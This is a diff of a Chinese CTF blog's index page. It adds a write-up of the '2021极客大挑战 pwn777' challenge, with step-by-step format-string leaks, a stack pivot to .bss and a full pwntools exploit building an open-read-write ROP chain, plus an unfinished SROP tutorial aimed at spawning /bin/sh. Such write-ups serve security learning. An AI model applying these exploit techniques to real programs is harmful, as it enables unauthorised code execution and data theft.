@@ -155,6 +155,232 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/" class="post-title-link" itemprop="url">2021极客大挑战-pwn777</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-12 14:55:42" itemprop="dateCreated datePublished" datetime="2021-12-12T14:55:42+08:00">2021-12-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-16 17:04:43" itemprop="dateModified" datetime="2021-12-16T17:04:43+08:00">2021-12-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><p>覆盖随机数种子、bss段的格式化字符串、ORW、栈迁移</p>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序保护如下</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/checksec.jpg" class>
+
+<p>main()函数如下</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/main.jpg" class>
+
+<p>我们分别查看每个函数，看到程序在init()函数中设置了沙箱</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/init.jpg" class>
+
+<p>检查沙箱保护</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/seccomp.jpg" class>
+
+<p>可以看到程序禁用了execve()函数，所以这题应该是要用 ORW 。</p>
+<p>welcome()是一堆普通的输出</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/welcome.jpg" class>
+
+<p>程序的第一个逻辑部分如下</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/game.jpg" class>
+
+<p>可以看到先有一次最长为 0x1c 字节长度的输入，然后需要猜对十次随机数，否则程序就会退出。这部分很简单，只需要将随机数种子覆盖即可预知随机数，查看该函数栈空间如下</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/game_stack.jpg" class>
+
+<p>seed 离我们的输入 name 差 0x20 - 0x8 = 0x18 个字节，然后再加上四个字节覆盖 seed，这部分的exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">lib = cdll.LoadLibrary(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name&quot;</span>,payload)</span><br><span class="line">lib.srand(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(lib.rand())</span><br><span class="line">    p.recvuntil(<span class="string">&quot;number:&quot;</span>)</span><br><span class="line">p.sendline(num)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success =&gt;&quot;</span>,i)</span><br></pre></td></tr></table></figure>
+
+<p>解决了第一部分，我们继续往下看</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/mymain.jpg" class>
+
+<p>这部分将存在于 .bss 段的 buf 与所给字符串进行比较，且比较长度正好为所给字符串长度，如果相等则 break ，查看fmt()函数如下 </p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/fmt.jpg" class>
+
+<p>这里存在一个格式化字符串漏洞，且 myread() 的作用就是往 buf 处输入最多 288 字节的输入。因为输入很长，所以足够我们在 buf 段构造 ROP 链，且 fmt() 函数嵌套在 while() 中，所以存在无限次的格式化字符串。</p>
+<p>因为我们要在 .bss 段构造 ROP 链，所以我们需要完成往 .bss 段的栈迁移，但是我们只有格式化字符串可以利用，所以我们直接利用格式化字符修改 mymain() 的 rbp 到 .bss 段，然后退出 mymain() 的循环，利用函数本身的 leave_ret 就可以完成栈迁移的过程。</p>
+<p>到这里思路就确定了，我们开始构造exp</p>
+<p>在修改 rbp 之前，我们共需要泄漏：①程序的地址——因为开启了 PIE。②libc地址——用来得到libc中的函数。③栈上的地址——因为格式化字符串的参数不在栈上，所以需要利用栈上的指针来修改栈上的地址。</p>
+<p>在 print() 处下断点查看栈空间</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/%E8%B0%83%E8%AF%95-1.jpg" class>
+
+<p>我们选择泄漏画圈的三个地址，偏移分别为6、7、13，泄漏的exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;best!&quot;</span>,<span class="string">&#x27;%13$p%7$p%6$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">lsm = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;__libc_start_main =&gt;&#x27;</span>,<span class="built_in">hex</span>(lsm)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">ret_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">pgm = ret_addr - <span class="number">0x166f</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;program_base =&gt;&#x27;</span>,<span class="built_in">hex</span>(pgm)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack =&gt;&#x27;</span>,<span class="built_in">hex</span>(stack)</span><br></pre></td></tr></table></figure>
+
+<p>到此我们完成了所需要的泄漏工作，可以开始修改 rbp 了，但是麻烦的一点是要将 rbp 修改为 .bss 段上的地址，我们需要将 6 个字节的地址全部都修改完，同时因为一次最多只能修改两个字节，所以我们需要三个存在于栈上并指向栈上的指针来完成修改的步骤，在这里刚好有三个（蓝线），我们需要让这三个指针都指向 rbp 所在的栈地址，这样就可以利用这三个指针来修改 rbp 的值。</p>
+
+
+<p>因为这三个指针跟 rbp 所在的栈地址只差1.5个字节，所以我们修改两个字节即可，计算得到这三个指针相对于格式化字符串的偏移分别为 6、15、29，所以修改指针部分的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rbp_addr = stack - <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rbp_addr&amp;<span class="number">0xffff</span>) + <span class="string">&#x27;c%6$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((rbp_addr&amp;<span class="number">0xffff</span>)+<span class="number">2</span>) + <span class="string">&#x27;c%15$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((rbp_addr&amp;<span class="number">0xffff</span>)+<span class="number">4</span>) + <span class="string">&#x27;c%29$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>stack 是我们泄漏出来的 rbp 的内容，而 rbp_addr 是 rbp 所在的栈地址，修改完后如下</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/%E8%B0%83%E8%AF%95-3.jpg" class>
+
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/%E8%B0%83%E8%AF%95-4.jpg" class>
+
+<p>可以看到我们得到了三个分别指向 rbp_addr 、rbp_addr + 2、rbp_addr + 4 的指针，然后就可以利用这三个指针来修改 rbp 的低六个字节了，计算这三个指针相对于格式化字符串的偏移分别为 10、41、43，修改 rbp 部分如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bss = pgm + <span class="number">0x4060</span></span><br><span class="line">bss_l = (bss&amp;<span class="number">0xffff</span>) + <span class="number">0x20</span></span><br><span class="line">bss_m = ((bss&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + <span class="number">0x10000</span></span><br><span class="line">bss_h = ((bss&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>) + <span class="number">0x20000</span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(bss_l) + <span class="string">&#x27;c%10$hn%&#x27;</span> + <span class="built_in">str</span>(bss_m-bss_l) + <span class="string">&#x27;c%41$hn%&#x27;</span> + <span class="built_in">str</span>(bss_h-bss_m) + <span class="string">&#x27;c%43$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>因为 .bss 段的低、中、高两个字节的大小顺序不是固定的，所以我们干脆输出 0x10000、0x20000个字节，这样写进去的时候也还是只写两个字节，这样就保证了大小顺序。同时我们考虑到我们要返回的话要输入题目所给的字符串 “jiaraniloveyou~” ，这部分字符串在输入后会覆盖 .bss 段的前几个字节，栈直接迁移到这里就会因为无法执行而报错，所以我们需要选择将 rbp 修改到 .bss 段稍微高一点的地址，所以加了 0x20 。</p>
+<p>修改完后如下：</p>
+<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/%E8%B0%83%E8%AF%95-5.jpg" class>
+
+<p>这样在程序返回的时候就可以借助程序本身的 <code>leave_ret</code> 将栈迁移到 .bss 段进而执行我们的代码了。</p>
+<p>接下来我们只需要构造ORW chain再返回即可，构造部分如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">libc_base = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">ret = pgm + <span class="number">0x101a</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1b92</span></span><br><span class="line">pop_rdi = pgm + <span class="number">0x1713</span></span><br><span class="line">pop_rsi_r15 = pgm + <span class="number">0x1711</span></span><br><span class="line">payload = p64(ret)*<span class="number">6</span> + p64(pop_rdi) + p64(bss + <span class="number">0xe0</span>) + p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_r15) + p64(bss + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(read)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(bss + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(write) + p64(u64(<span class="string">&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>payload 前面的 ret 是用来垫高 ORW chain 部分的，防止被后面用来退出的输入覆盖，ORW部分很简单就不赘述了。</p>
+<p>最后输入 “jiaraniloveyou~” 用来退出循环即可。</p>
+<p>完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">lib = cdll.LoadLibrary(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name&quot;</span>,payload)</span><br><span class="line">lib.srand(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(lib.rand())</span><br><span class="line">    p.recvuntil(<span class="string">&quot;number:&quot;</span>)</span><br><span class="line">    p.sendline(num)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success =&gt;&quot;</span>,i)</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;best!&quot;</span>,<span class="string">&#x27;%13$p%7$p%6$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">lsm = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;__libc_start_main =&gt;&#x27;</span>,<span class="built_in">hex</span>(lsm)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">ret_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">pgm = ret_addr - <span class="number">0x166f</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;program_base =&gt;&#x27;</span>,<span class="built_in">hex</span>(pgm)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack =&gt;&#x27;</span>,<span class="built_in">hex</span>(stack)</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">rbp_addr = stack - <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rbp_addr&amp;<span class="number">0xffff</span>) + <span class="string">&#x27;c%6$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((rbp_addr&amp;<span class="number">0xffff</span>)+<span class="number">2</span>) + <span class="string">&#x27;c%15$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((rbp_addr&amp;<span class="number">0xffff</span>)+<span class="number">4</span>) + <span class="string">&#x27;c%29$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">bss = pgm + <span class="number">0x4060</span></span><br><span class="line">bss_l = (bss&amp;<span class="number">0xffff</span>) + <span class="number">0x20</span></span><br><span class="line">bss_m = ((bss&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + <span class="number">0x10000</span></span><br><span class="line">bss_h = ((bss&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>) + <span class="number">0x20000</span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(bss_l) + <span class="string">&#x27;c%10$hn%&#x27;</span> + <span class="built_in">str</span>(bss_m-bss_l) + <span class="string">&#x27;c%41$hn%&#x27;</span> + <span class="built_in">str</span>(bss_h-bss_m) + <span class="string">&#x27;c%43$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">libc_base = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">ret = pgm + <span class="number">0x101a</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1b92</span></span><br><span class="line">pop_rdi = pgm + <span class="number">0x1713</span></span><br><span class="line">pop_rsi_r15 = pgm + <span class="number">0x1711</span></span><br><span class="line">payload = p64(ret)*<span class="number">6</span> + p64(pop_rdi) + p64(bss + <span class="number">0xe0</span>) + p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_r15) + p64(bss + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(read)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(bss + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(write) + p64(u64(<span class="string">&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;jiaraniloveyou~&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/06/SROP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/06/SROP/" class="post-title-link" itemprop="url">SROP</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-06 21:43:55" itemprop="dateCreated datePublished" datetime="2021-12-06T21:43:55+08:00">2021-12-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-17 20:34:40" itemprop="dateModified" datetime="2021-12-17T20:34:40+08:00">2021-12-17</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="SROP（没写完）"><a href="#SROP（没写完）" class="headerlink" title="SROP（没写完）"></a>SROP（没写完）</h2><h4 id="一些比较好的文章"><a href="#一些比较好的文章" class="headerlink" title="一些比较好的文章"></a>一些比较好的文章</h4><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85810">【技术分享】Sigreturn Oriented Programming攻击简介 - 安全客，安全资讯平台 (anquanke.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/luozhaotian/article/details/79607572"> SROP基本原理和利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/1081">SROP_「二进制安全pwn基础」 - 网安 (wangan.com)</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/112509274">BUUCTF]PWN——ciscn_2019_es_7[详解]</a></p>
+<p>SROP利用了Linux系统信号处理过程中的漏洞：在信号处理过程中会将用户态上下文环境及寄存器的值保存在用户态的栈中，处理完后再读取栈中的数据恢复寄存器的值。其中“处理完后再读取栈中的数据恢复寄存器中的值”就是 sigreturn 系统调用的作用，它会读取当前栈空间中的数据并传给相应寄存器。</p>
+<p>sigreturn 系统调用会改变所有寄存器的值，包括RSP/ESP与RBP/EBP的值，所以虽然可以利用SROP来实现任何想要的系统调用，但是同时其会改变栈顶指针，有时候这不是我们想要的。</p>
+<p>综上，SROP的攻击思路就是利用栈溢出设置返回地址为 sigreturn 系统调用的gadget，然后在栈上布置对应寄存器的数据，待 sigreturn 系统调用结束，所以寄存器的值都会变成我们布置在栈上的值。</p>
+<p>完成一次 SROP 攻击需要具备四个条件：</p>
+<ol>
+<li>存在栈溢出漏洞，使得栈上的数据可控</li>
+<li>需要知道 ‘/bin/sh’ 的地址，如果是自己构造在栈上的，那就需要知道栈的地址</li>
+<li>需要知道 syscall 指令在内存中的地址</li>
+<li>需要知道 sigreturn 系统调用的内存地址（这个单独的gadget并不是必须的，因为 sigreturn 也是一个系统调用，只要令 <code>rax = 15</code> 或 <code>eax = 77 </code> ，然后再调用 syscall 指令，就相当于调用了 sigreturn ）</li>
+</ol>
+<h3 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h3><p>整个程序的代码段只有如下部分</p>
+<img src="/2021/12/06/SROP/assembly.jpg" class>
+
+<p>反汇编如下</p>
+<img src="/2021/12/06/SROP/start.jpg" class>
+
+<p>从汇编代码来看，程序只是做了将相应的寄存器赋值的工作，然后就执行 <code>syscall_ret</code> 了，其中从 <code>mov rsi,rsp</code> 可知 read() 在栈顶处写入内容，结合汇编代码可知 <code>ret</code> 返回的地址也是栈顶中的内容，所以我们输入的前八个字节可以控制返回地址。</p>
+<p>因为程序只有这么些代码，显然需要我们手动构造系统调用来getshell，显然因为我们能利用的汇编段有限，所以大部分寄存器的值都无法直接被我们修改，所以这时我们可以利用 SROP 来将我们想修改的寄存器修改为对应值，而要调用 sigreturn 则需要 rax = 15 ，也就是系统调用号 = 15，那么怎么控制 rax 的值？我们需要知道read() 的返回值存放在 rax 中，而 read() 的返回值就是其读取的字节数，那么我们就可以通过控制输入的字节数来控制 rax 寄存器进而调用 sigreturn 。</p>
+<p>因为我们最终需要通过 SROP 来调用 <code>execve(&quot;/bin/sh&quot;,0,0)</code> ，所以我们还需要泄漏栈上的地址，否则无法计算出 “/bin/sh” 所在的地址。所以我们需要先调用一个输出函数，延续上述思路，我们通过控制输入的字节数来控制 rax ，同时在本题中合适的输出函数似乎只有 write() ，而 write() 的系统调用号为 1 ，我们需要做到：①只输入一个字节的同时控制返回地址。②write() 函数调用完后的返回地址也需要控制。</p>
+<p>那么怎么实现呢？我们可以在第一次输入时就将返回地址写入栈上，我们输入三个 <code>p64(0x4000B0)</code> ，第一个用来控制这次调用的返回，然后我们在第二次输入时输入 ‘\xb3’ 来将第一次输入时写入栈上的 ‘0x4000B0’ 的低字节的 ‘\xb0’ 覆盖掉，这样就控制了第二次的返回地址为 ‘0x4000B3’ ，返回到 ‘0x4000B3’ 是为了跳过 ‘0x4000B0’ 处的 <code>xor rax, rax</code> ，否则 rax 就被置0了。第二次返回之后就会调用 <code>write(1,&#39;rsp&#39;,0x400)</code> ，输出位于栈上的 0x400 个字节的数据，这其中肯定有栈上的地址，这样就完成了泄漏的工作，同时我们第一次输入时的第三个 ‘0x4000B0’ 控制了 write() 的返回，此后程序就会再调用一次 read() ，我们就可以继续后面的操作。</p>
+<p>read函数输入15个字节后返回到 b3 ，== 调用 sigreturn，后面要接 sigfram</p>
+<p>sigfram 和 ‘/bin/sh’ 一起send，这次在15字节之前send，所以要两次read</p>
+<p>现在这次send sig和bin ，</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -862,273 +1088,6 @@ syscall指令可以在IDA中 alt + t 找到
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/" class="post-title-link" itemprop="url">格式化字符串</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-18 14:48:51" itemprop="dateCreated datePublished" datetime="2021-11-18T14:48:51+08:00">2021-11-18</time>
-            </span>
